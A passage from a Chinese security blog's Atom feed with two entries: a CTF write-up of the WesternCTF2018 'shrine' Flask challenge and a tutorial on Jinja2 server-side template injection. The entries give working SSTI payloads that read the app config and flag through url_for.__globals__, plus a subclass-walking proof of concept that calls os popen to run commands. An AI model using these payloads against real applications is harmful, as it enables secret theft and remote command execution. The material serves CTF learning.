    <content type="html"><![CDATA[<p>打开界面出现源码，是一个flask的框架。审计一下</p><p><img src="/2020/05/15/WesternCTF2018-shrine/1.png" alt></p><p>1.设置app的配置文件为flag同时删除环境变量中的flag。那么就是要想办法从配置文件中获取flag了。</p><p>2.<img src="/2020/05/15/WesternCTF2018-shrine/2.png" alt></p><p>这里过滤掉了<code>()</code>以及config、self。那么就不能直接通过<code></code>或<code></code>来获取配置文件了<br>。<code>self.__dict__</code>内存储着类的静态函数、类函数、普通函数、全局变量以及一些内置的属性。也不能使用<code>__subclasses__()</code>来执行shell命令</p><p>最后<code>return flask.render_template_string(safe_jinja(shrine))</code>语句可以确认存在着注入点。先测试一下</p><p><code>http://e91f3d14-bdaa-4601-86c4-ebe6cc5d478e.node3.buuoj.cn/shrine/%7B%7B2*2%7D%7D</code></p><p><img src="/2020/05/15/WesternCTF2018-shrine/3.png" alt></p><p>3.这里可以用<code>get_flashed_messages(), url_for()</code>来读取配置文件</p><p><code>url_for()</code></p><p>一般我们通过一个URL就可以执行到某一个函数。如果反过来，我们知道一个函数，怎么去获得这个URL呢？url_for函数就可以帮我们实现这个功能。url_for()函数接收两个及以上的参数，他接收函数名作为第一个参数，接收对应URL规则的命名参数，如果还出现其他的参数，则会添加到URL的后面作为查询参数。</p><p><code>get_flashed_messages()</code></p><p>返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</p><p>个人理解这两个函数都用于flask，他的全局属性中也就会存储flask当前对象的许多信息，包括配置信息。</p><p>3.这里试例url_for()。payload:</p><p><code>http://e91f3d14-bdaa-4601-86c4-ebe6cc5d478e.node3.buuoj.cn/shrine/%7B%7Burl_for.__globals__%7D%7D</code></p><p><img src="/2020/05/15/WesternCTF2018-shrine/4.png" alt></p><p>这里找到了current_app。也就是当前的app对象的信息。再找到app的配置信息payload:</p><p><code>http://e91f3d14-bdaa-4601-86c4-ebe6cc5d478e.node3.buuoj.cn/shrine/%7B%7Burl_for.__globals__[&#39;current_app&#39;].config%7D%7D</code></p><p><img src="/2020/05/15/WesternCTF2018-shrine/5.png" alt></p><p>找到了flag。当然用<code>http://e91f3d14-bdaa-4601-86c4-ebe6cc5d478e.node3.buuoj.cn/shrine/%7B%7Burl_for.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]%7D%7D</code>也是一样的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;打开界面出现源码，是一个flask的框架。审计一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/05/15/WesternCTF2018-shrine/1.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;1.设置app的配置文件为flag同时删除环境变量中的flag。那么就是要想办法从
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>flask 模板注入</title>
    <link href="http://yoursite.com/2020/05/13/flask-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/05/13/flask-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</id>
    <published>2020-05-13T12:09:53.000Z</published>
    <updated>2020-05-23T17:08:09.849Z</updated>
    
    <content type="html"><![CDATA[<h5 id="之前对于flask模板注入只看了下大概的原理。在buu又遇到了这个题。在这里做一个总结"><a href="#之前对于flask模板注入只看了下大概的原理。在buu又遇到了这个题。在这里做一个总结" class="headerlink" title="之前对于flask模板注入只看了下大概的原理。在buu又遇到了这个题。在这里做一个总结"></a>之前对于flask模板注入只看了下大概的原理。在buu又遇到了这个题。在这里做一个总结</h5><p>这位师傅总结得很好，我就再自己实操一遍，加深理解。<br><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">参考链接</a></p><p>模板注入简单来说就是由于代码不规范或信任了用户输入而导致了服务端模板注入&#40;和sql注入很相似&#41;</p><p>flask中模板注入最主要的还是使用了render_template_string&#40;template&#41;渲染字符串。如果在模板中有”%&#40;request.url&#41;”这样的语句。&#40;template&#41;就会将&#123;&#123;&#125;&#125;中的语句一起解析，造成注入。而使用render_template&#40;&#41;就可以避免这种情况。原因在于使用render_template&#40;&#41;时，模板已经提前渲染好了，用户恶意传入的&#123;&#123;&#125;&#125;的语句并不会再次解析。</p><p><strong>接下来是利用的方法</strong></p><p>在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。例如我们打印一下””的基类</p><p>1.<code>__class__</code>  可以得到一个对象的类型</p><p><code>print(&quot;&quot;.__class__)</code><br>得到结果：<code>&lt;class &#39;str&#39;&gt;</code></p><p>2.<code>__bases__</code>得到一个对象的基类</p><p><code>print(&quot;&quot;.__class__.__bases__)</code> 得到结果：<code>&lt;class &#39;object&#39;&gt;</code></p><p>3.<code>__mro__</code> 列出解析方法调用的顺序</p><p><code>print(&quot;&quot;.__class__.__mro__)</code><br>得到结果：<code>&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;</code> 即先解析str类，再解析object类。</p><p>4.<code>__subclasses__()</code> 返回一个类的子类</p><p><code>print(&quot;&quot;.__class__.__bases__[0].__subclasses__())</code></p><p>得到结果<code>[&lt;class &#39;type&#39;&gt;, &lt;class &#39;weakref&#39;&gt;, &lt;class &#39;weakcallableproxy&#39;&gt;, &lt;class &#39;weakproxy&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;.....(还有很多就不全部列举了)</code></p><p>在这些子类中，我们可以找到一个有趣的模块–os。而os模块中有调用系统shell的方法，我们可以据此执行命令。</p><p>可以利用如下代码找到与os有关的子类的位置</p><p><code>a = &#39;&#39;.__class__.__bases__[0].__subclasses__()for index, value in enumerate(a):    value = str(value)  # 返回的为type类型。需要转化为数值型才能迭代    if &#39;os.&#39; in value:        print(index)        print(value)</code></p><p>得到结果<br><code>133&lt;class &#39;os._wrap_close&#39;&gt;134&lt;class &#39;os._AddedDllDirectory&#39;&gt;</code></p><p>在os._wrap_close中，有我们喜闻乐见的函数–popen&#40;&#41;</p><p>最后的poc:</p><p><code>print(&#39;&#39;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__[&#39;popen&#39;](&#39;cmd&#39;).read())</code></p><p>其中<code>__init</code>用于初始化类。<code>__globals__</code>全局来查找所有的方法及变量及参数。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h5 id=&quot;之前对于flask模板注入只看了下大概的原理。在buu又遇到了这个题。在这里做一个总结&quot;&gt;&lt;a href=&quot;#之前对于flask模板注入只看了下大概的原理。在buu又遇到了这个题。在这里做一个总结&quot; class=&quot;headerlink&quot; title=&quot;之前对于fl
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
